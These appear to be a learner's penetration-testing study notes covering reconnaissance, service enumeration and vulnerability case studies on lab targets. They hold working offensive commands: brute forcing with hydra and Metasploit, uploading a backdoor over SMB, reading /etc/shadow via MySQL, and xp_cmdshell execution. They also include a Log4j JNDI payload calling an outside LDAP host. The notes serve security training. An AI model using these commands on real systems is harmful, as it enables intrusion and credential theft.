# Information gathering
#infogathering

## Passive info gathering (legal public info)
### website recon & footprinting:
whatis --> check the use of a function (eg whatis host)
host --> DNS lookup utility find the ip for given domain name

important directories to look for info:
/robots.txt --> used to specify directories that search engines web crawlers will disregard
/sitemap.xml --> provides search engines an organised way of indexi ang a site

wappalyzer --> used to see technologies used by site
whatweb --> tool to see check tech used by sites
webhttrack --> can be used to download and mirror unsecure sites

### whois Enumeration
--> gives bunch of info on site  (Admin/domain emails city/state address registrant contact etc)

### Netcraft
--> gather info about a domain (like whois,but also the technology like wappalyzer)
Note: VPN services like cloudflare means not all info is correct, some redacted by cloudflare

--> Exploit history can also be found 

### DNSrecon / DNS dumpster
--> dns info, mail server info

## WAF
wafwoof --> checks if a webapp is protected by firewall

### Google Dorks 
google tricks,
site:somesite.com --> search only the site
inurl:admin
intitle: index of --> common vulnerability of webservers not configured properly(directory is public)
site: "star".ine.com --> searches for subdomains
filetype: pdf, xls
inurl:auth_user_file.txt
inurl:passwd.txt

google hacking database --> gives some dork templates to search for vulnerable sites
waybackmachine....cool i guess?? to see old info possibly leaked 

### Email harvester
theharvester --> uses public info to find emails, hosts, ips, subdomains (works like netcraft etc)
eg:
theHarvester -d hacks.com -b bing,google,linkedin
Gather emails to password spray different account (when users reuse pwd for diff sites)

### Password Spray
haveibeenpwned.com --> use to see if email/number has been compromised 


## Active info gathering

### Zone Transfer
--> provides a good map of the network layout on the target network

DNS records:
A - ipv4
AAAA - ipv6
NS - reference to the domains nameserver
MX - dns to a mail server
CNAME - used for domain aliases
TXT - Text record
HINFO - displays host info
SOA - domain authority
SRV - service records
PTR - resolve ip to hostname (reverse DNS basically)

Tools:
dnsrecon -d {name of domain}
dnsenum
fierce -dns {domain name} ------> eg fierce -dns zonetransfer.me

sudo vim /etc/hosts --> "local" DNS records. List of hostnames and ip addr
	--> can add your router config ip with something like router.home.admin to make it searchable in browser
note: For zone transfer to work it must be enabled on the networks DNS server


### NMAP
Standard nmap stuff
gtk stuff:
-sn ping sweep
-Pn port scan w/o checking if host is alive (do this for windows systems as they usually block icmp reqs)
-F fast scan. only the top10o popular ports
-sC run some nmap scripts to identify more info about ports
-A aggressive scan. Uses -sV -sO and -sC
-T<0-5> speed up time of scan. Higher is faster
| T0       | T1     | T2     | T3     | T4         | T5     |
| -------- | ------ | ------ | ------ | ---------- | ------ |
| Paranoid | Sneaky | Polite | normal | Aggressive | Insane | 

-oN outputs to a new file.....(use it!!!)
-oX outputs into a XML format. Useful for metapsloit


# FootPrinting and Scanning

## ARP scan
arp-scan
eg:
sudo arp-scan -I tap0 -g 10.142.111.0/24
--> asks for the mac adresses of all the hosts connected to the subnet on interface tap0
--> note arp-scan doesnt show your own ip and mac address



## ICMP scan
-Ping
	-echo request...wait for reply
-fping (ping but for multiple)
eg:
	fping -I tap0 -g 10.142.111.0/24 -a
	--> outputs all hosts that are alive but includes the error messages.
	fping -I tap0 -g 10.142.111.0/24 -a 2>/dev/null
	--> redirects error (shown as output 2) to /dev/null blackhole
	--> note: stdin is 0, stdout is 1, stderr is 2
-Traceroute
-NMAP (uses more than just ICMP can check wireshark to see)
eg:
	nmap -sn 10.142.111.0/24
-zenmap (GUI version of NMAP)

IMPT: ARP and FPING shows different hosts alive sometimes as not all hosts replys to ping msgs

## Host discovery
--> nmap compares the hosts signature to a databse to guess the OS and services etc

--> NMAP scans for UDP are slow but can be sped up 
eg T5
Note Windows blocks certain icmp scans .... use  -Pn flag on nmap

GTK:
nmap UDP service scan -sUV
usually the open UDP ports are -p1-250 (a lot of guess work for the srervices tho)

# Enumeration
#services #enums 
## Servers and Services
A server is any computer that provides a service (a programme that give functionality)
Common services provided by servers: File sharing, Deliver/collect emails, host a website

File sharing : Server Message Block (SMB) ,Network File system(NFS)
File transfer (upload/download) :  File Transfer protocol (FTP) 
Command execution: Secure Shell Protocol (SSH)
Hyper text: HTTP
Database: MySQL, MSSQL

## SMB
Generic term: Common Internet File System (CIFS)
Windows implimentation of a file system
Common ports on windows machines: 135, 139, 445, 3389
SMB port: 445 and usually Netbios port: 139 is used to set up session for SMB
Version: Windows server etc
use NMAP -sC scripts to get more info

How its usually used:
```powershell
net use z: \\10.4.17.133\c$ smbserver_password /user:administrator
```
This adds the drive to windows network folder. Seen in windows file explorer as a shared drive.

To delete sessions
```powershell
net use * / delete
```
#### Nmap scripts for smb
checks for misconfigurations of SMB (using outdated versions/default configs etc)
Easily missed stuff
Note: p445 is where microsoft-ds smb is open on
```bash
nmap -p445 --script smb-protocols 10.4.31.2

nmap -p445 --script smb-security-mode 10.4.31.2
```
On example:
guest acct is accessible (let nmap log in as guest)
```bash
nmap -p445 --script smb-enum-sessions 10.4.31.2
```
log in using known creds (cmd shud be on one line to work)
```bash
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

Enumerate shares w/o and w authentication (files etc IPC null sessions also found here ):
```bash
nmap -p445 --script smb-enum-shares 10.4.31.2

nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

#list shares plus ls the directories found
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

```

Enumerate users
```bash
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

Other info :
```bash
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2

nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.4.31.2
```

#### SMBmap
enumerate
```bash
#enumerate to see share access
smbmap -u guest -p "" -d . -H 10.4.26.58
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
```
RCE available
```bash
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -x 'ipconfig'
#read the c drive (to also check if backdoor is dled)
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 -r 'C$'
#upload backdoor file from root folder to the c drive
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --upload '/root/backdoor' 'C$\backdoor'
#download
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58 --download 'C$\flag.txt'
```
#### Linux uses of SMB
version scan: Samba smbd

Metasploit scanner for smb
auxiliary/scanner/smb/smb_version

Some tools choose 1 get good
```bash
#Tool to enumerate groups, see which we can connect to (<20> means can connect with client) :
nmblookup -A 192.223.132.3

#List available shares to connect to (w/o authenticating) / Also gives the samba server description in the comments
smbclient -L 192.223.132.3 -N

#Connect with emoty user name and no pass
rpcclient -U "" -N 192.223.132.3

#another tool to ind the OS, users and bunch of other stuff
enum4linux -o 192.76.243.3
enum4linux -U 192.76.243.3

#find if it uses smb2 using metasploit (useful info for later??)
auxiliary/scanner/smb/smb2
```
Connect to smb if null session exists (no authentication needed):
```bash
#conect without password null session
smbclient //192.4.17.3/Public -N

#if credentials found after cracking etc
smbclient //192.4.17.3/jane -U jane
smbclient //192.4.17.3/admin -U admin
#then enter password found
```

useful rpcclient commands
```rpcclient
      SRVSVC
        srvinfo         Server query info
   netshareenum         Enumerate shares
netshareenumall         Enumerate enumall shares
netsharegetinfo         Get Share Info
netsharesetinfo         Set Share Info

 
   querydominfo         Query domain info
   enumdomusers         Enumerate domain users
  enumdomgroups         Enumerate domain groups
  enumalsgroups         Enumerate alias groups
    enumdomains         Enumerate domains
  createdomuser         Create domain user
 createdomgroup         Create domain group
 createdomalias         Create domain alias
    
#to get sid of a user
lookupnames admin
```

Cracking to enter without auth:
 metasploit
 ```bash
 auxiliary/scanner/smb/smb_login
 set rhost ....
 set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
 #user found from enumeration
 set smbuser jane
```
Hydra
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.125.25.3 smb
```

Find pipes connected in a smb user
```msfconsole
use auxiliary/scanner/smb/pipe_auditor
```

Find sid of user
```bash
enum4linux -r -u"admin" -p "password1" 192.125.26.3
```

note: flag.tar.gz
use: "tar -xf flag.tar.gz" to unzip

## FTP
Common versions : ProFTP / VSFTPD
port: 21 
Connect
```bash
#default has no creds can try without anyt if not must bf
ftp 192.213.157.3
```
Hydra to get creds (long ass chunk)
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.213.157.3 ftp
```
Nmap to bf with a known user
```bash
#Save the username in a list
echo "sysadmin" > users
cat users
#should show "sysadmin" in there
nmap 192.213.157.3 --script ftp-brute --script-args userdb=/root/users -p 21

#no known users
nmap 192.155.248.3 --script ftp-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/common_users.txt,passdb=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -p21
```

Easy Targets of FTP:
for older default implementations
FTP anon login --> "anonymous" user doesnt need password



## SSH
port: 22
interact with a remote shell over an encrypted channel
First determine if its windows or linux, linux always has root@[ipaddr]
Connect
```bash
ssh root@192.244.123.3

#run commands in ssh using nmap scripts
nmap 192.158.121.3 -p22 --script ssh-run --script-args ssh-run.username=student,ssh-run.password="",ssh-run.cmd="cat FLAG"
```
Some enums
```bash
nc 192.244.123.3 22
#might spit out the version of ssh but wont connect as its not the right protocol but good for enums

#shows all the algos that could have been used to create the ssh key
#what u want is that rsa key
nmap 192.244.123.3 -p 22 --script ssh2-enum-algos

#full rsa host key, save it for later
nmap 192.244.123.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full

#check supported auth methods for the user student/admin, if none means no password
nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"
nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"
```

hydra dictionary attack
```bash
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.244.123.3 ssh
```
nmap script attack
```bash
echo "administrator"> user
nmap 192.244.123.3 -p 22 --script ssh-brute --script-args userdb=/root/user
```
msfconsole
```msfconsole
use auxiliary/scanner/ssh/ssh_login
set ...
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
```
## HTTP
Some tools:

Windows servers for hosting HTTP service Internet Infomation Services (IIS)
```bash
#dumps some info on the web server by using a bunch of scripts
whatweb 10.4.18.97

#gets header info from the server
http 10.4.18.97

#bf the directories
dirb http://10.4.18.97

#renders the site on command line ??? quite cool useful if you dont have browser access
browsh --startup-url http://10.4.18.97/Default.aspx

#nmap script to enum like dirb but smaller wlist
nmap 10.4.18.97 -p80 --script http-enum

#http header info
nmap 10.4.18.97 -p80 --script http-headers

#get method info from a given directory found from enum (enum or dirb)
nmap 10.4.18.97 -p80 --script http-methods --script-args http-methods.url-path=/webdav/

#scanner for webdav
nmap 10.4.18.97 -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/
```

Ubuntu, Linux Unix distribution, Running Apache:
Very similar enums as windows only until u get to the shell portions
Eg service: Apache httpd 2.x.x (Ubuntu)
```bash
#pulls the banner. Good for finding service version
nmap 192.32.62.3 -p80 -script banner

#curl method for info, piped to "more" as the info is too much. "more" gives 1 page at a time
#header info everything shows
curl 192.32.62.3 | more

#wget same as curl but downloads instead of stdout (1)
wget "http://192.32.62.3/index"
cat index | more

#same as windows
browsh --startup-url 192.32.62.3

#renders the page but parses it as text (not as cool as browsh but more readable)
lynx http://192.32.62.3
 
```
Metasploit enumeration method:
```msfconsole
#scans version
use auxiliary/scanner/http/http_verison

#uses the metasploit wordl to bf dirs
use auxiliary/scanner/http/brute_dirs
```

```bash 
#same as the brute dirs in msfconsole
dirb http://192.32.62.3 /usr/share/metasploit-framework/date/wordlists/directory.txt
```

#### Robots.txt
used by web browsers to understand which pages are within bounds to web crawl
--> can be used to find subdirs and what not

```msfconsole
use auxiliary/scanner/http/robots.txt
```
curl any found subdir to check them out

## SQL
#### Common linux sql server 
Mysql
Port: 3306
connect to 
```bash
mysql -h 192.125.250.3 -u root 
#defualt login with no password
```

Traverse the DBs
```Mysql
show databases;

use <database name>;
show tables

#number of entries in table authour
select count(*) from authors

#dump all the entries in te table
select * from <some table name>
```

MSF enumeration
see the writable directories that not necessarily is part of the db
```msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt

#useful for setting global rhost
setg rhosts 192.125.250.3

#to see more options
advanced

#see writable files
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

#dump database schema
use auxiliary/scanner/mysql/mysql_schemadump
set username root


```
Another tool
dumps users and their pwdhashes
```msfconsole
use auxiliary/scanner/mysql/mysql_hashdump

```

Mysql tricks 
note: msf enums before showed that /etc/shadow is a writeable dir so it should load
```mysql
mysql -h 192.1.2.3 -u root
select load_file("/etc/shadow")

#can see the system pwd hash for users here
#eg chunk with hash inside
root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
#eg hash (not sure how to tell whr it starts/ends from the chunk but oh well)
S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/
```

Nmap enum as usual
```bash
#check if there are any users with no passwords
nmap 192.32.122.3 -p 3306 --script=mysql-empty-password 

#info about the db
nmap 192.32.122.3 -p 3306 --script=mysql-info
#showed the ver number 
# and Some capabilities: InteractiveClient which is allows access to the system via mysql

#enum the users
nmap 192.32.122.3 -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"

#enum the databases
nmap 192.32.122.3 -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

#enum the data
nmap 192.32.122.3 -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
#most impt is the data-dir: /var/lib/mysql shows where the vars are stored

#full check to see if development passes safety
#file privelges etc
nmap 192.32.122.3 -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

#same hash dump as msf
nmap 192.32.122.3 -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"

#using nmap to send a sql query??? cool but...just use mysql
nmap 192.32.122.3 -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
```

### Dictionary attack on db
(note use tab completion for the pass_file......)
if u need a password for a known username
```msfconsole
use auxiliary/scanner/mysql/mysql_login
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set stop_on_success true
set username root
```

hydra
It autoknows to use standard port 3306 but if a non-std port used, pass it in aswell
```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.99.154.3 mysql
```

### Microsoft version of sql server
MSSQL
port: 1433
```bash
nmap 192.32.122.3 -p 1433 --script=ms-sql-info

#ntlm is the authentication protocol used on networks (challenge/response)
nmap 192.32.122.3 -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433
# above code spits out target_name and netbios info

#brute force username and password
nmap 192.32.122.3 -p 1433 --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt

#check for empty passwords
nmap 192.32.122.3 -p 1433 --script=ms-sql-empty-password


nmap 192.32.122.3 -p 1433 --script=ms-sql-query --script-args mssql.username=admin,mssql.password=safeword,ms-sql-query.query="SELECT * from master..syslogins" -oN output.txt
#open output.txt with a text editor to make it easier ot see

#hash dump
nmap 192.32.122.3 -p 1433 --script=ms-sql-dump-hashes --script-args mssql.username=admin,mssql.pasword=anamaria

nmap 192.32.122.3 -p 1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.pasword=anamaria,ms-sql-xp-cmdshell.cmd="ip config"
```

impt: For any version of sql can always check the nse site for useful scriptes to use

##### Metaspoit for mssql
if u know nothing bf everything
```msfconsole
use auxiliary/scanner/mssql/mssql_login
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false
```

Enumerate if user received (requires authentication is found)
```msfconsole
#enum the server using creds found before
#can see that xp_cmdshell enabled needed for the next part
use auxiliary/admin/mssql/mssql_enum

#enumerate the users tru the server logins incase any were missed before
use auxiliary/admin/mssql/mssql_enum_sql_logins

#try to run comands (whoami in this case) using a given set of creds
use auxiliary/admin/mssql/mssql_exec
set cmd whoami

#brute force to find system accounts domain accts
use auxiliary/admin/mssql/mssql_enum_domain_accounts

```





# Vulnerability assesment

## Overview
Vulnerability
NIST defn:
A weakness in computational logic (ie code) found in a software and hardware component that, when exploited, result in a negative immpact to confidentiality, integrity, availability. (CIA triad)

Types.
Physical

CyberSecurity:
>Software (service)
>Operating System

CVEs:
Unique common identifier

Understanding Vulnerability details page:
>Descriptions
>Severity
>References
>weakness enuumeration
>Known affected software configurations

### Case studies

1. Heartbleed bug ( CVE-2014-0160 )
	nmap script ssl-heartbleed to test (scan against any port using ssl)
	How it works:
	During a TLS handshake a password and passwrd length are sent to the server.
	The server sends back the same password up to the length specified, but if the length is longer than the actual password, additionally info stored in memory is sent with it
Example:
Real TLS handshake
Password: abcd
pwlength: 4

Server sends back: confirmed, abcd

Heartbleed
password: abcd
pwlength: 100

Server sends back: confirmed, abcdt1g3j12j3jasddfg3.... (up to the 100 char length)

2. EternalBlue MS17-010 (CVE-2017-0143/144)
Part of the ransomware wannacry attack, Zeroday exploit that took adv of smbv1 in many windows OS's
Bufferoverflow used
nmap script to scan : smb-vuln-ms17-010

Example:
SMB packet with malicious code (reverse shell) sent to the server, bufferoverflow allows for RCE
Makes a call back to attacker giving a shell.
In the case of wannacry, EternalBlue used to send the ransomware

3. Log4J (CVE-2021-44228)
Apache Log4j2 2.0-beta9 JNDI features used in config,log msgs, and params do not protect against attacket controlled LDAP and other JNDI end pts
Attacker who can control log messages or log message params can execute arbitrary code on LDAP servers when msg lookup substituition is enabled

JNDI: Java Naming and Directory Interface (API directory service to lookup data)
LDAP: Light-weight Directory Access Protocol , (allows access to code stored remotely to keep app lightweight) 

NSE nmap scripts to detect it exists but are new 

Java applicatns (webapp or otherwise) use Log4j for logging. Developers use it for debugging.
Effect on Minecraft:
Input field used is the chat,
In the chat send : ${jndi:ldap://demo.ine:1389/yourcode}
---> server fails to parse input as str and evaluates the JNDI lookup
---> Java class (ie java code elsewhr) is pulled from the attackers LDAP server


### Vulnerability research example
Badblue 2.7

Search on google
searchsploit the services
Search National Vulnerability Database
Search on ExploitDB for PoC exploits
--> Find arbitrary code execution etc


